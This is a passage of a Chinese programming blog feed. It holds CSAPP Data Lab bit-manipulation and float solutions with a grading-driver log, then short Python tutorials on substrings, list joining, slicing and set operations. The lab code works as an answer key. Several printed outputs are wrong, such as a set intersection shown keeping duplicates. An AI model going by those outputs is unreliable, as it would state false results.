</span>&#123;</span><br><span class="line">    <span class="comment">/* Create mask for n = 0 */</span></span><br><span class="line">    <span class="keyword">int</span> zmask = (~!n)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> left = x &lt;&lt; n;</span><br><span class="line">    <span class="comment">/* Arithmetic shift right by 32-n */</span></span><br><span class="line">    <span class="keyword">int</span> right = x &gt;&gt; (<span class="number">33</span> + ~n);</span><br><span class="line">    <span class="comment">/* Mask off upper 1's */</span></span><br><span class="line">    <span class="keyword">int</span> lmask = ~<span class="number">0</span> &lt;&lt; n;</span><br><span class="line">    right &amp;= ~lmask;</span><br><span class="line">    <span class="keyword">return</span> (zmask&amp;x) | (~zmask&amp;(left|right));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 法2(其他方法-10’)</span></span><br><span class="line"><span class="comment">/* 先构造y为高（32-n）位为0的y，再与x右移（32-n）的x相与，相当于储存了x的高n位数，最后再与x左移n位相加即可。 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rotateLeft</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    y=~((~<span class="number">0</span>)&lt;&lt;n);</span><br><span class="line">    x=(x&lt;&lt;n)+((x&gt;&gt;(<span class="number">32</span>+(~n+<span class="number">1</span>)))&amp;y);</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="37-float_absc"><a class="markdownIt-Anchor" href="#37-float_absc"></a> 3.7 float_abs.c</h2><p><strong>注释</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *   float_abs - Return bit-level equivalent of absolute value of f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument..</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><strong>题目</strong>：</p><p>给予⼀个无符号整数表示的浮点数 <code>uf</code> (你可以认为 <code>uf</code> 具有浮点数的比特级结构) ，函数返回它的绝对值，即 <code>|uf|</code> (返回的结果也是⼀个无符号整数表示的浮点数)，如果这个数是 <code>NaN</code> ，请返回它本身。</p><p><strong>实现</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 法1（标准答案）</span></span><br><span class="line"><span class="comment">/* */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_abs</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> mask = <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="built_in">abs</span> = uf &amp; ~mask;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">abs</span> &gt; <span class="number">0x7F800000</span>)</span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">abs</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 法2（目前最佳答案）</span></span><br><span class="line"><span class="comment">/* https://blog.csdn.net/qq_43544682/article/details/102874816 */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_abs</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=uf&amp;<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;<span class="number">0x7f800000</span>)</span><br><span class="line">        <span class="keyword">return</span> uf;<span class="comment">//NaN</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="38-float_f2i"><a class="markdownIt-Anchor" href="#38-float_f2i"></a> 3.8 float_f2i</h2><p><strong>注释</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *   float_f2i - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><strong>题目</strong>：</p><p>给予⼀个无符号整数表示的浮点数 <code>uf</code> (你可以认为 <code>uf</code> 具有浮点数的比特级结构) ，函数返回它对应的强制类型转换后的整数（具有整数的比特级结构），即实现表达式 <code>(int)uf</code> ，如果这个数超过整数表示的范围（包括 <code>NaN</code> 和无穷），请返回 <code>0x80000000u</code>。</p><p><strong>实现</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 法1（标准答案）</span></span><br><span class="line"><span class="comment">/* */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">float_f2i</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> sign = uf &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> frac = uf &amp; <span class="number">0x7FFFFF</span>;</span><br><span class="line">  <span class="comment">/* Create normalized value with leading one inserted,</span></span><br><span class="line"><span class="comment">     and rest of significand in bits 8--30.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">unsigned</span> val = <span class="number">0x80000000</span>u + (frac &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> &lt; <span class="number">127</span>) &#123;</span><br><span class="line">    <span class="comment">/* Absolute value is &lt; 1 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> &gt; <span class="number">158</span>)</span><br><span class="line">    <span class="comment">/* Overflow */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">  <span class="comment">/* Shift val right */</span></span><br><span class="line">  val = val &gt;&gt; (<span class="number">158</span> - <span class="built_in">exp</span>);</span><br><span class="line">  <span class="comment">/* Check if out of range */</span></span><br><span class="line">  <span class="keyword">if</span> (sign) &#123;</span><br><span class="line">    <span class="comment">/* Negative */</span></span><br><span class="line">    <span class="keyword">return</span> val &gt; <span class="number">0x80000000</span>u ? <span class="number">0x80000000</span>u : -val;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Positive */</span></span><br><span class="line">    <span class="keyword">return</span> val &gt; <span class="number">0x7FFFFFFF</span> ? <span class="number">0x80000000</span>u : val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 法2（目前最佳答案）</span></span><br><span class="line"><span class="comment">/*  */</span></span><br></pre></td></tr></table></figure><h1 id="4-其他"><a class="markdownIt-Anchor" href="#4-其他"></a> 4 其他</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">liuzhenlong@debian:~/Lab_new/lab1-handout$ ./driver.pl</span><br><span class="line">1. Running <span class="string">'./dlc -z'</span> to identify coding rules violations.</span><br><span class="line"></span><br><span class="line">2. Compiling and running <span class="string">'./btest -g'</span> to determine correctness score.</span><br><span class="line">gcc -O -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.c</span><br><span class="line">btest.c: In <span class="keyword">function</span> ‘test_function’:</span><br><span class="line">btest.c:332:23: warning: ‘arg_test_range[1]’ may be used uninitialized <span class="keyword">in</span> this <span class="keyword">function</span> [-Wmaybe-uninitialized]</span><br><span class="line">     <span class="keyword">if</span> (arg_test_range[1] &lt; 1)</span><br><span class="line">         ~~~~~~~~~~~~~~^~~</span><br><span class="line"></span><br><span class="line">3. Running <span class="string">'./dlc -Z'</span> to identify operator count violations.</span><br><span class="line"></span><br><span class="line">4. Compiling and running <span class="string">'./btest -g -r 2'</span> to determine performance score.</span><br><span class="line">gcc -O -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.c</span><br><span class="line">btest.c: In <span class="keyword">function</span> ‘test_function’:</span><br><span class="line">btest.c:332:23: warning: ‘arg_test_range[1]’ may be used uninitialized <span class="keyword">in</span> this <span class="keyword">function</span> [-Wmaybe-uninitialized]</span><br><span class="line">     <span class="keyword">if</span> (arg_test_range[1] &lt; 1)</span><br><span class="line">         ~~~~~~~~~~~~~~^~~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5. Running <span class="string">'./dlc -e'</span> to get operator count of each <span class="keyword">function</span>.</span><br></pre></td></tr></table></figure><p>运行<code>./driver.pl</code>会报warning，批改学生作业时，有一个同学提出了解答：👍</p><blockquote><p>关于 ./driver.pl 中的预警问题，是因为 ./btest.c 在299行申请的变量没有进行初始化赋值，后面的程序检测到这个位置可能会被访问而提出的预警，给其付个初始值即可解决</p></blockquote><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/qq_43544682/article/details/102874816" target="_blank" rel="noopener">计算机系统基础 实验一 csapp date lab1</a></li><li><a href="https://zhuanlan.zhihu.com/p/339047608" target="_blank" rel="noopener">CSAPP:Lab1 -DataLab 超详解</a></li><li><a href="https://blog.csdn.net/qq_45677541/article/details/123955438" target="_blank" rel="noopener">CSAPP: Lab1:Data Lab 实验 （虚拟机安装+Lab环境配置+README及实验引导翻译+如何编译+函数实现）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计组 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-yield用法详解</title>
      <link href="/2022/04/04/Python-yield%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/"/>
      <url>/2022/04/04/Python-yield%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p><strong>参考</strong>：<a href="https://blog.csdn.net/mieleizhi0522/article/details/82142856" target="_blank" rel="noopener">python中yield的用法详解——最简单，最清晰的解释</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-字符串-统计子串个数</title>
      <link href="/2022/04/04/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E7%BB%9F%E8%AE%A1%E5%AD%90%E4%B8%B2%E4%B8%AA%E6%95%B0/"/>
      <url>/2022/04/04/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E7%BB%9F%E8%AE%A1%E5%AD%90%E4%B8%B2%E4%B8%AA%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p><strong>参考</strong>：<a href="https://blog.csdn.net/u014675548/article/details/46332843" target="_blank" rel="noopener">Python里统计一个字符串中子字符串的个数</a></p><p>母串<code>str1 = 'ababa'</code>，子串<code>str2='aba'</code>，统计子串有两种情况：</p><ol><li>重复统计：被统计过的字符还可以参与统计，所以子串数量为3；</li><li>不重复统计：被统计过的字符不再参与统计，所以子串数量为2。</li></ol><h1 id="2-实现"><a class="markdownIt-Anchor" href="#2-实现"></a> 2 实现</h1><h2 id="21-重复统计"><a class="markdownIt-Anchor" href="#21-重复统计"></a> 2.1 重复统计</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = <span class="string">"abababa"</span></span><br><span class="line">reg = re.compile(<span class="string">"(?=aba)"</span>)</span><br><span class="line">length = len(reg.findall(s))</span><br><span class="line">print(length)  <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><h2 id="22-不重复统计"><a class="markdownIt-Anchor" href="#22-不重复统计"></a> 2.2 不重复统计</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"abababa"</span></span><br><span class="line">print(s.count(<span class="string">'aba'</span>))  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-列表-将list中的值拼接成字符串</title>
      <link href="/2022/04/04/Python-%E5%88%97%E8%A1%A8-%E5%B0%86list%E4%B8%AD%E7%9A%84%E5%80%BC%E6%8B%BC%E6%8E%A5%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2022/04/04/Python-%E5%88%97%E8%A1%A8-%E5%B0%86list%E4%B8%AD%E7%9A%84%E5%80%BC%E6%8B%BC%E6%8E%A5%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p>在Python中，有时需要将list以字符串的形式输出。如<code>list = ['a', 'b', 'c']</code>，要求输出<code>abc</code>。</p><p><strong>参考</strong>：<a href="https://cloud.tencent.com/developer/article/1389881" target="_blank" rel="noopener">python技巧——将list中的每个int元素转换成str</a></p><h1 id="2-实现"><a class="markdownIt-Anchor" href="#2-实现"></a> 2 实现</h1><h2 id="21-元素是字符或字符串"><a class="markdownIt-Anchor" href="#21-元素是字符或字符串"></a> 2.1 元素是字符或字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test_list = [<span class="string">"h"</span>, <span class="string">"e"</span>, <span class="string">"l"</span>, <span class="string">"l"</span>, <span class="string">"o"</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">""</span>.join(test_list))  <span class="comment"># hello</span></span><br><span class="line">print(<span class="string">","</span>.join(test_list))  <span class="comment"># h,e,l,l,o</span></span><br></pre></td></tr></table></figure><h2 id="22-元素中含有数字"><a class="markdownIt-Anchor" href="#22-元素中含有数字"></a> 2.2 元素中含有数字</h2><h3 id="221-新建list"><a class="markdownIt-Anchor" href="#221-新建list"></a> 2.2.1 新建list</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test_list = [<span class="string">"h"</span>, <span class="string">"e"</span>, <span class="string">"l"</span>, <span class="string">"l"</span>, <span class="string">"o"</span>, <span class="number">6</span>]</span><br><span class="line">test_list_new = [str(x) <span class="keyword">for</span> x <span class="keyword">in</span> test_list]</span><br><span class="line"></span><br><span class="line">print(<span class="string">""</span>.join(test_list_new))  <span class="comment"># hello6</span></span><br><span class="line">print(<span class="string">","</span>.join(test_list_new))  <span class="comment"># h,e,l,l,o,6</span></span><br></pre></td></tr></table></figure><h3 id="222-lambda表达式"><a class="markdownIt-Anchor" href="#222-lambda表达式"></a> 2.2.2 lambda表达式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test_list = [<span class="string">"h"</span>, <span class="string">"e"</span>, <span class="string">"l"</span>, <span class="string">"l"</span>, <span class="string">"o"</span>, <span class="number">6</span>]</span><br><span class="line">test_list_new = map(<span class="keyword">lambda</span> x: str(x), test_list)</span><br><span class="line"></span><br><span class="line">print(<span class="string">""</span>.join(test_list_new))  <span class="comment"># hello6</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-字符串-截取特定部分</title>
      <link href="/2022/04/03/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E6%88%AA%E5%8F%96%E7%89%B9%E5%AE%9A%E9%83%A8%E5%88%86/"/>
      <url>/2022/04/03/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E6%88%AA%E5%8F%96%E7%89%B9%E5%AE%9A%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>截取字符串中特定部分的方法：可以使用 <code>str[beginIndex:endPosition]</code>，其中<code>str</code>为需要截取的字符串，<code>beginIndex</code>为需要截取的第一个字符的下标，<code>endPosition</code>为截取字符最后一个字符的下标。</p><p>该部分和 <code>Python-字符串-分割字符串</code> 有点类似。</p><p><strong>参考</strong>：<a href="https://www.php.cn/python-tutorials-465121.html" target="_blank" rel="noopener">python如何截取字符串中特定部分</a></p><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><h2 id="21-切片"><a class="markdownIt-Anchor" href="#21-切片"></a> 2.1 切片</h2><p><code>str[l,r]</code>：字符串可以理解成一个下标从0开始的数组，这里表示<code>[l,r)</code>的部分；<code>l</code>不写默认0，<code>r</code>不写默认最后一个；<code>l</code>和<code>r</code>也可以是负数，表示截取方向从右到左。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test_str = <span class="string">"hello.python"</span></span><br><span class="line">print(test_str[<span class="number">1</span>:<span class="number">4</span>])  <span class="comment"># ell</span></span><br><span class="line">print(test_str[:<span class="number">4</span>])  <span class="comment"># hell</span></span><br><span class="line">print(test_str[<span class="number">1</span>:])  <span class="comment"># ello.python</span></span><br><span class="line">print(test_str[<span class="number">-3</span>:<span class="number">-1</span>])  <span class="comment"># ho</span></span><br><span class="line">print(test_str[<span class="number">-3</span>:])  <span class="comment"># hon</span></span><br></pre></td></tr></table></figure><h2 id="22-index切片"><a class="markdownIt-Anchor" href="#22-index切片"></a> 2.2 index+切片</h2><p>先获取字符的下标位置，再通过以上的方法截取。</p><p><code>a.index(b, begin, end)</code>：<code>a</code>为需要校验字符串，<code>b</code>为字符串，<code>begin</code> 为开始截取的字符的下标（默认为<code>0</code>），<code>end</code>结束字符下标（默认为字符长度），截取字符串<code>[begin,end)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test_str = <span class="string">"hello.python"</span></span><br><span class="line">ch = <span class="string">'.'</span></span><br><span class="line"></span><br><span class="line">print(test_str.index(ch))  <span class="comment"># 5</span></span><br><span class="line">print(test_str[:test_str.index(ch)])  <span class="comment"># Hello</span></span><br><span class="line">print(test_str[test_str.index(ch):])  <span class="comment"># .python</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-列表-交集并集差集</title>
      <link href="/2022/04/03/Python-%E5%88%97%E8%A1%A8-%E4%BA%A4%E9%9B%86%E5%B9%B6%E9%9B%86%E5%B7%AE%E9%9B%86/"/>
      <url>/2022/04/03/Python-%E5%88%97%E8%A1%A8-%E4%BA%A4%E9%9B%86%E5%B9%B6%E9%9B%86%E5%B7%AE%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-list的集合运算"><a class="markdownIt-Anchor" href="#1-list的集合运算"></a> 1 list的集合运算</h1><h2 id="11-交集"><a class="markdownIt-Anchor" href="#11-交集"></a> 1.1 交集</h2><p><strong>方法1</strong>：朴素的遍历；如果列表出现重复元素，该方法会出现问题，<strong>重复元素可能会保留</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 无重复元素</span></span><br><span class="line">a = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line">tmp = [val <span class="keyword">for</span> val <span class="keyword">in</span> a <span class="keyword">if</span> val <span class="keyword">in</span> b]</span><br><span class="line">print(tmp)  <span class="comment"># [2, 5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有重复元素 </span></span><br><span class="line">a = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line">tmp = [val <span class="keyword">for</span> val <span class="keyword">in</span> a <span class="keyword">if</span> val <span class="keyword">in</span> b]</span><br><span class="line">print(tmp)  <span class="comment"># [2, 2, 5]</span></span><br></pre></td></tr></table></figure><p><strong>方法2</strong>：转化为set操作，<strong>速度快</strong>；<strong>重复元素不会保留</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 无重复元素</span></span><br><span class="line">a = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line">print(list(set(a).intersection(set(b))))  <span class="comment"># [2, 5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有重复元素</span></span><br><span class="line">a = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line">print(list(set(a).intersection(set(b))))  <span class="comment"># [2, 2, 5]</span></span><br></pre></td></tr></table></figure><h2 id="12-并集"><a class="markdownIt-Anchor" href="#12-并集"></a> 1.2 并集</h2><p><strong>方法1</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line">print(list(set(a+b)))  <span class="comment"># [2, 3, 4, 5, 8]</span></span><br></pre></td></tr></table></figure><p><strong>方法2</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line">print(list(set(a).union(set(b))))  <span class="comment"># [2, 3, 4, 5, 8]</span></span><br></pre></td></tr></table></figure><h2 id="13-差集"><a class="markdownIt-Anchor" href="#13-差集"></a> 1.3 差集</h2><p><strong>方法1</strong>：朴素的遍历；如果列表出现重复元素，该方法会出现问题，<strong>重复元素可能会保留</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 无重复元素</span></span><br><span class="line">a = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line">tmp = [val <span class="keyword">for</span> val <span class="keyword">in</span> b <span class="keyword">if</span> val <span class="keyword">not</span> <span class="keyword">in</span> a]  <span class="comment"># b中有而a中没有的</span></span><br><span class="line">print(tmp)  <span class="comment"># [8]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有重复元素 </span></span><br><span class="line">a = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">8</span>]</span><br><span class="line">tmp = [val <span class="keyword">for</span> val <span class="keyword">in</span> b <span class="keyword">if</span> val <span class="keyword">not</span> <span class="keyword">in</span> a]  <span class="comment"># b中有而a中没有的</span></span><br><span class="line">print(tmp)  <span class="comment"># [8, 